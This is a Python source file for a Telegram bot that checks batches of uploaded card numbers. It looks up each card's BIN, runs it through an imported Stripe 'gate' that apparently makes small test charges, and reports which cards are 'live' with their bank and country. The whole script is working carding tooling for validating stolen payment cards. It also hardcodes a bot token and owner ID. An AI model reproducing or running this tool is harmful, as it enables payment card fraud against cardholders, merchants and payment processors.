import requests
import telebot,time
import time
from telebot import types
from gate import Tele
import os
token = '8057302563:AAHP3pluJYyNDDlWrDVjoc9uuzTmZW-4uCw' #bottoken
bot=telebot.TeleBot(token,parse_mode="HTML")
subscriber = '5671920054'
allowed_users = ['5671920054']  #Your ID
@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in allowed_users:
        bot.reply_to(message, "              @slgslgslgsl")
        return
    bot.reply_to(message, "    ")
@bot.message_handler(commands=["add"])
def add_user(message):
    if str(message.chat.id) == '5671920054':  # Only bot owner can add new users
        try:
            new_user_id = message.text.split()[1]  # Extract new user ID from the command
            allowed_users.append(new_user_id)
            bot.reply_to(message, f"User ID {new_user_id} Has Been Added Successfully.\nCongratulations! Premium New User ")
        except IndexError:
            bot.reply_to(message, "Please provide a valid user ID. Example: /add 123456789")
    else:
        bot.reply_to(message, "You do not have permission to add users.")
@bot.message_handler(content_types=["document"])
def main(message):
	if str(message.chat.id) not in allowed_users:
		bot.reply_to(message, "              @slgslgslgsl")
		return
	dd = 0
	live = 0
	incorrect = 0
	ch = 0
	ko = (bot.reply_to(message, "   ...").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=' \n   @slgslgslgsl')
						os.remove('stop.stop')
						return
				try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
				except: pass
				try:
					brand = data['brand']
				except:
					brand = 'Unknown'
				try:
					card_type = data['type']
				except:
					card_type = 'Unknown'
				try:
					country = data['country_name']
					country_flag = data['country_flag']
				except:
					country = 'Unknown'
					country_flag = 'Unknown'
				try:
					bank = data['bank']
				except:
					bank = 'Unknown'
				
				start_time = time.time()
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					last = "Error"
				if 'Stripe Error: Your card was declined.' in last:
					last='Your Card Was Declined'
				elif 'Declined - Call Issuer' in last:
					last='Declined - Call Issuer'
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f" {cc} ", callback_data='u8')
				status = types.InlineKeyboardButton(f"   : {last} ", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"   : [ {live} ] ", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"    : [ {incorrect} ] ", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"   : [ {dd} ] ", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"         :  [ {total} ] ", callback_data='x')
				stop=types.InlineKeyboardButton(f"[   ]", callback_data='stop')
				mes.add(cm1,status, cm3, cm4, cm5, cm6, stop)
				end_time = time.time()
				execution_time = end_time - start_time
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''   
  <a href='t.me/slgslgslgsl'>😍😍YMZ😍😍</a> ''', reply_markup=mes)
				msg = f'''
<a href='t.me/slgslgslgsl'>-</a>  
<a href='t.me/slgslgslgsl'></a>			
<a href='t.me/slgslgslgsl'></a> <code>{cc}</code><a href='t.me/slgslgslgsl'></a>
<a href='t.me/slgslgslgsl'>-</a> : <code>Stripe Charge 1$</code>		
<a href='t.me/slgslgslgsl'>-</a> : <code>Payment Successful </code>

<a href='t.me/slgslgslgsl'>-</a> : <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='t.me/slgslgslgsl'>-</a> : <code>{country} - {country_flag}</code>
<a href='t.me/slgslgslgsl'>-</a> : <code>{bank}</code>

<a href='t.me/slgslgslgsl'>-</a> : <code>1{"{:.1f}".format(execution_time)} </code> 
<a href='t.me/slgslgslgsl'>-</a>  : <a href='t.me/slgslgslgsl'>😍😍YMZ😍😍</a>'''
				print(last)
				if 'success' in last or 'Processor Declined - Fraud Suspected' in last or 'Declined - Call Issuer' in last or 'Stripe Error: Your card does not support this type of purchase.' in last or "Stripe Error: Your card's security code is invalid." in last:
					live += 1
					bot.reply_to(message, msg)
				elif 'Card Not Activated' in last:
					incorrect+=1
				elif 'security code is incorrect.' in last:
					msg = f'''
<a href='t.me/slgslgslgsl'>-</a>   
<a href='t.me/Approved_Raven'></a>			
<a href='t.me/slgslgslgsl'></a> <code>{cc}</code><a href='t.me/Approved_Raven'></a>
<a href='t.me/slgslgslgsl'>-</a> : <code>Stripe Charge 1$</code>		
<a href='t.me/slgslgslgsl'>-</a> : <code>AUTH Completed </code>

<a href='t.me/slgslgslgsl'>-</a> : <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='t.me/slgslgslgsl'>-</a> : <code>{country} - {country_flag}</code>
<a href='t.me/slgslgslgsl'>-</a> : <code>{bank}</code>

<a href='t.me/slgslgslgsl'>-</a> : <code>1{"{:.1f}".format(execution_time)}  </code>
<a href='t.me/slgslgslgsl'>-</a>  : <a href='t.me/slgslgslgsl'>😍😍YMZ😍😍</a>'''
					live += 1
					bot.reply_to(message, msg)
				elif 'Card Not Activated' in last:
					incorrect+=1
				elif 'security code is incorrect.' in last or 'Stripe Error: Your card has insufficient funds.' in last or 'tree_d' in last:
					msg = f'''
<a href='t.me/slgslgslgsl'>-</a>  !!
<a href='t.me/Approved_Raven'></a>			
<a href='t.me/slgslgslgsl'></a> <code>{cc}</code><a href='t.me/Approved_Raven'></a>
<a href='t.me/slgslgslgsl'>-</a> : <code>Stripe Charge 5$</code>		
<a href='t.me/slgslgslgsl'>-</a> : <code>Insufficient Funds </code>

<a href='t.me/slgslgslgsl'>-</a> : <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='t.me/slgslgslgsl'>-</a> : <code>{country} - {country_flag}</code>
<a href='t.me/slgslgslgsl'>-</a> : <code>{bank}</code>

<a href='t.me/slgslgslgsl'>-</a> : <code>2{"{:.1f}".format(execution_time)}  </code>
<a href='t.me/slgslgslgsl'>-</a>  : <a href='t.me/slgslgslgsl'>😍😍YMZ😍😍</a>'''
					live += 1
					bot.reply_to(message, msg)
				elif 'Card Not Activated' in last:
					incorrect+=1
				else:
					dd += 1
					time.sleep(10)
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='  \n   @slgslgslgsl')
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
logop = f'''😍😍Run😍😍
'''
print(logop)
bot.polling()
